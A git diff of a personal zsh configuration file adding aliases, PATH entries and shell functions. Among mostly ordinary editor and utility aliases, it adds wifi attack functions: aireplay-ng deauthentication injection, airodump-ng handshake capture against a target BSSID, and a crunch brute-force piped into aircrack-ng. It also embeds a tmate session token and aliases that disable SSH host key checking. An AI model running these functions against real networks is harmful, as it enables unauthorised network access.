@@ -1,4 +1,5 @@
 
+# echo 255 > /tmp/brightness; sudo cp /tmp/brightness /sys/class/leds/smc::kbd_backlight/brightness; rm /tmp/brightness
 echo -e '\033[?6c'
 source .profile
 # xmodmap ~/.xmaptoazerty
@@ -19,13 +20,58 @@ export PATH="/usr/lib/w3m/:$PATH"
 export PATH="$HOME/snap/:$PATH"
 # export PATH="$HOME/.gord/:$PATH"
 export PATH="/snap/bin/nvim:$PATH"
+export PATH="/snap/bin/:$PATH"
 export PATH="$HOME/.stubgen-2.07/:$PATH"
 export PATH=$PATH:/usr/local/go/bin
+export PATH="$HOME/go/bin/:$PATH"
 mkpi=192.168.1.77 
 ipi=192.168.1.25
 cm4=192.168.1.71
 hp=192.168.1.61
 ilinux=192.168.1.17
+# cw=wlx30de4b20e988
+cwtp=wlx30de4b20e988
+cw=wlp3s0
+cwm=prism0
+mkpiTmate=taQJkT5qyKqTJnef9k5RMfjuZ@lon1.tmate.io
+
+
+function testInject(){
+    # sudo aireplay-ng --test $cwm
+    sudo aireplay-ng --test $cwtp
+}
+
+function initMonitor(){
+    sudo ifconfig $cw down
+    sudo iwconfig $cw mode monitor
+    sudo ifconfig $cw up
+}
+
+function startMonitor(){
+    sudo airmon-ng check kill
+    sudo airmon-ng start $1
+}
+
+function monitor(){
+    # if [[ -z $1 ]] ; then
+        # sudo airodump-ng $cwm
+    # else
+	sudo airodump-ng $1
+    # fi
+
+}
+
+
+# sudo airodump-ng -c 11 --bssid A8:6A:BB:89:C0:9E -w /tmp/dictio wlx30de4b20e988
+function attack(){
+    sudo airodump-ng -c $1 --bssid $2 -w /tmp/attack $cwtp
+}
+
+# sudo aireplay-ng -0 10 -a A8:6A:BB:89:C0:9E wlx30de4b20e988
+function inject (){
+    sudo aireplay-ng -0 $1 -a $2 $cwtp
+}
+
 
 function gord() {
 	if [ -d $DISPLAY ]; then
@@ -37,8 +83,14 @@ function gord() {
 	if [ -d $DISPLAY ]; then
 		TERM=xterm-256color
 	fi
+	echo -e '\033[?6c'
 }
+ALL_CHARACTERS=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789
 
+function crack(){
+    crunch 1 15 $ALL_CHARACTERS | aircrack-ng /tmp/attack*.cap -w h:- -b $1 
+	# crunch $1 $2 $3 | aircrack-ng /tmp/attack-01.cap -w h:- -b $4
+}
 
 # Set name of the theme to load --- if set to "random", it will
 # load a random theme each time oh-my-zsh is loaded, in which case,
@@ -209,7 +261,34 @@ alias tms="tmux source-file ~/.tmux.conf"
 # }
 
 alias cleanVimSession="rm ~/.local/share/nvim/sessions/%home%mkovel* & "
-alias nv="(cleanVimSession) > /dev/null 2>&1; /snap/bin/nvim -p "
+# alias nv="(cleanVimSession) > /dev/null 2>&1; /snap/bin/nvim -p "
+alias nv="/snap/bin/nvim -p"
+alias nvdiff="/snap/bin/nvim -d"
+alias nvd="nvdiff"
+alias nvt="nv +term"
+
+funcion nv() {
+	if [[ -z $1 ]]; then
+		/snap/bin/nvim -p
+	fi
+	if [[ $1 == "-d" ]]; then
+	    /snap/bin/nvim -d
+	    # local args=$@
+	    # /snap/bin/nvim $args
+	fi
+
+}
+
+
+# funcion nv() {
+#     if [[ -z $1 ]]; then
+# 		/snap/bin/nvim -p
+# 	else if [[ $1 == "-d" ]]; then
+# 	    /snap/bin/nvim -d
+# 	    # local args=$@
+# 	    # /snap/bin/nvim $args
+# 	fi
+# }
 # alias nv="nvim"
 
 alias DirectBackup_="sudo dd if=/dev/mmcblk0 of=/dev/sda bs=4096 status=progress conv=notrunc,noerror"
@@ -243,8 +322,17 @@ alias gs="git status"
 # send 192.168.1.77 test.txt result.txt
 
 alias ssh="ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no"
-alias scp="scp -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no"
-
+alias  scp="scp -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no"
+# function scp(){
+#     if [[ $1 == "-r" ]]; then
+# 		shift
+# 		scp -ro UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "$@"
+# 	else
+# 		# scp -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "$@"
+# 		# scp "$@" 
+# 		echo "$@"
+# 	fi
+# }
 function send() {
     ip_address="$1"
     shift
@@ -341,12 +429,39 @@ alias d="date > /tmp/date; acpi >> /tmp/date; cat /tmp/date|cowsay -f bulbasaur;
 alias battery="acpi"
 alias shutdown="sudo shutdown now"
 alias reboot="sudo reboot now"
-alias meteo="curl wttr.in/bruxelles"
-alias weather="curl wttr.in/bruxelles"
+alias meteo="curl wttr.in/bruxelles|less"
+alias weather="curl wttr.in/bruxelles|less"
 alias loadKeyboard="sudo loadkeys ~/.keymap"
 # alias d="date | cowsay -f www"
 # alias d="date | cowsay -f charmander"
 alias nvimLua="rm -rf .config/nvim; mkdir .config/nvim; cp -r .config/nvimLuaOnly/* .config/nvim/ " 
 alias nvimclassic="rm -rf .config/nvim; mkdir .config/nvim; cp -r .config/oldNvim/* .config/nvim/ " 
 alias torrentDowload="sudo rtorrent -n -d ~/Téléchargements/torrents/"
-alias hibernate="sudo echo suspend in 3 secs; sleep 3 ;sudo pm-suspend"
+# alias hibernate="sudo echo suspend in 3 secs; sleep 3 ;sudo pm-suspend"
+
+function hibernate(){
+	sudo echo "suspend in 3 secs"
+	sleep 1
+	sudo echo "suspend in 2 secs"
+	sleep 1
+	sudo echo "suspend in 1 secs"
+	sleep 1
+	sudo pm-suspend
+}
+
+
+
+alias l="exa -lhagH --octal-permissions"
+
+alias cal="khal --color interactive"
+alias generateMavenProject="~/.generateMavenProject.sh"
+alias upgrade="sudo apt update && sudo apt upgrade"
+alias cat="bat"
+alias dua="dua i"
+alias rp="rip"
+alias j="just"
+alias jm="just make"
+alias jr="just run"
+alias jmr="just make run"
+alias updateTmateiLinux="scp mkovel@192.168.1.17:~/airlinux.tmate ~/tmate/"
+eval "$(zoxide init zsh)"
